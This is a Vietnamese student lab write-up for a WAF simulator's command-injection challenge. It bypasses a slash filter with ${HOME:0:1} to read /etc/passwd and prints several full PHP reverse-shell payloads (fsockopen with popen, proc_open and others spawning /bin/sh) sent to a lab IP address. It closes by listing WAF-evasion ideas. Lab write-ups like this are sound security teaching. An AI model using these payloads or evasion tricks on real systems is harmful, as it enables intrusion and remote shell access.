# **Writeup: WAF Simulator Lab - Challenge 3: Command Injection Bypass**

Writeup này trình bày chi tiết quá trình phân tích và khai thác lỗ hổng Command Injection trong **Challenge 3** của WAF Simulator Lab.

-   **Môi trường Lab:** `http://36.50.135.185:5000/`
-   **Mục tiêu Challenge:** Thực thi lệnh `cat /etc/passwd` mà không sử dụng trực tiếp ký tự `/`.
-   **Yêu cầu nâng cao:** Cắm reverse shell vào máy chủ.

## **Mục lục**
1.  [Phân tích lỗ hổng và cơ chế phòng thủ của WAF](#bước-1-phân-tích-lỗ-hổng-và-cơ-chế-phòng-thủ-của-waf)
2.  [Giải quyết yêu cầu cơ bản: Đọc file `/etc/passwd`](#bước-2-giải-quyết-yêu-cầu-cơ-bản-đọc-file-etcpasswd)
3.  [Nâng cao: Nỗ lực cắm Reverse Shell](#bước-3-nâng-cao-nỗ-lực-cắm-reverse-shell)
4.  [Phân tích các phản hồi của WAF và hướng đi tiếp theo](#bước-4-phân-tích-các-phản-hồi-của-waf-và-hướng-đi-tiếp-theo)
5.  [Kết luận](#bước-5-kết-luận)

---

## **Bước 1: Phân tích lỗ hổng và cơ chế phòng thủ của WAF**

Khi truy cập vào Challenge 3, chúng em nhận được thông báo:
> No command executed. Try to craft a command without direct "/". to cat /etc/passwd

-   **Lỗ hổng:** Command Injection tại tham số `input` trên URL.
-   **Cơ chế phòng thủ của WAF:** Ứng dụng (hoặc WAF phía trước) đã được cấu hình để chặn (block) bất kỳ input nào chứa ký tự `/`. Đây là một cơ chế phòng thủ cơ bản để ngăn chặn các cuộc tấn công Path Traversal hoặc việc chỉ định đường dẫn tuyệt đối đến các file thực thi.

## **Bước 2: Giải quyết yêu cầu cơ bản: Đọc file `/etc/passwd`**

Để bypass cơ chế chặn ký tự `/`, cần tìm một cách khác để sinh ra ký tự này trong môi trường shell của máy chủ. Một kỹ thuật phổ biến là sử dụng biến môi trường.

Trên các hệ thống Linux, biến môi trường `$HOME` thường có giá trị là `/home/<username>` hoặc `/root`. Ký tự đầu tiên của biến này chính là `/`. Ta có thể sử dụng kỹ thuật Shell Parameter Expansion để trích xuất ký tự này.

-   **Kỹ thuật bypass:** `${HOME:0:1}` sẽ trả về ký tự đầu tiên (`/`) của biến `$HOME`.

Từ đó, ta xây dựng payload hoàn chỉnh để đọc file `/etc/passwd`:
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

Khi gửi payload này qua tham số `input` trên URL, ta đã đọc thành công nội dung của file `/etc/passwd` và hoàn thành yêu cầu cơ bản của bài lab.

### **Bước 3: Nâng cao: Nỗ lực cắm Reverse Shell**

Với yêu cầu nâng cao từ giảng viên, nhóm đã thử nghiệm nhiều phương pháp khác nhau để có được một reverse shell, chủ yếu tập trung vào việc thực thi PHP one-liner.

#### **Thử nghiệm 1: Sử dụng `popen`**
-   **Payload:**
    ```http
    http://36.50.135.185:5000/ch3-cmd?input=php%20-r%20%27$sock=fsockopen(%2236.50.135.185%22,5000);popen(%22${HOME:0:1}bin${HOME:0:1}sh%20-i%20%3C&3%20%3E&3%202%3E&3%22,%20%22r%22);%27
    ```
-   **Kết quả:** `Command chain detected — executed multiple instructions (simulated).`
-   **Phân tích:** WAF đã phát hiện việc sử dụng ký tự `;` để nối chuỗi hai câu lệnh (`fsockopen` và `popen`). Điều này cho thấy WAF có cơ chế chặn command chaining.

#### **Thử nghiệm 2: Sử dụng `proc_open`**
-   **Payload:**
    ```http
    http://36.50.135.185:5000/ch3-cmd?input=php%20-r%20%27$sock=fsockopen(%2236.50.135.185%22,5000);$proc=proc_open(%22${HOME:0:1}bin${HOME:0:1}sh%20-i%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27
    ```
-   **Kết quả:** `WAF BLOCKED: keyword`
-   **Phân tích:** Payload này cũng sử dụng `;` nên bị chặn bởi lỗi command chaining. Tuy nhiên, kể cả khi không có command chaining, WAF cũng đã phát hiện và chặn trực tiếp từ khóa `proc_open`, cho thấy WAF có một danh sách đen (blacklist) các hàm nguy hiểm.

#### **Các thử nghiệm khác (`exec`, `system`, `passthru`)**
-   **Các payload tương tự đã được thử:**
    ```php
    php -r '$sock=fsockopen(...);exec(...);'
    php -r '$sock=fsockopen(...);system(...);'
    php -r '$sock=fsockopen(...);passthru(...);'
    ```
-   **Kết quả:** Tất cả đều trả về lỗi `Command chain detected — executed multiple instructions (simulated).`
-   **Phân tích:** Giống như thử nghiệm đầu tiên, tất cả các payload này đều bị chặn do sử dụng ký tự `;` để thực thi nhiều lệnh.

### **Bước 4: Phân tích các phản hồi của WAF và hướng đi tiếp theo**

Từ các thử nghiệm trên, ta có thể tổng kết lại các cơ chế phòng thủ của WAF trong challenge này:

-   **Chặn ký tự `/`:** Đã bypass thành công bằng `${HOME:0:1}`.
-   **Chặn Command Chaining:** WAF phát hiện và chặn các ký tự dùng để nối lệnh như `;`. Có khả năng các ký tự khác như `|`, `&`, `&&` cũng bị chặn.
-   **Blacklist các từ khóa/hàm nguy hiểm:** WAF đã chặn hàm `proc_open`. Rất có thể các hàm thực thi lệnh khác (`exec`, `system`, `shell_exec`, `passthru`, `popen`) cũng nằm trong danh sách này.

**Hướng đi tiếp theo:**
-   **Bypass Command Chaining:** Tìm cách thực thi lệnh mà không cần các ký tự nối lệnh. Ví dụ, sử dụng backticks (`` `lệnh_1` ``) hoặc `$(lệnh_1)` nếu môi trường shell cho phép.
-   **Bypass Keyword Blacklist:** Thử các kỹ thuật obfuscation để che giấu các từ khóa bị chặn, ví dụ như nối chuỗi trong PHP (`'proc'.'_open'`) hoặc sử dụng các biến.
-   **Sử dụng các phương pháp Reverse Shell khác:** Tìm kiếm các one-liner reverse shell (ví dụ bằng Python, Perl, Bash) không sử dụng các hàm hoặc ký tự đã bị WAF chặn.

### **Bước 5: Kết luận**

Nhóm đã hoàn thành yêu cầu cơ bản của Challenge 3 bằng cách bypass thành công cơ chế chặn ký tự `/` để đọc nội dung file `/etc/passwd`.

Đối với yêu cầu nâng cao, mặc dù chưa cắm được reverse shell thành công, nhóm đã thực hiện nhiều thử nghiệm quan trọng và qua đó đã phân tích, xác định được thêm các lớp phòng thủ khác của WAF, bao gồm việc chặn nối chuỗi lệnh và blacklist các hàm nguy hiểm. Quá trình này cung cấp những kinh nghiệm quý báu về việc "fingerprint" và tìm cách vượt qua một hệ thống WAF trong thực tế.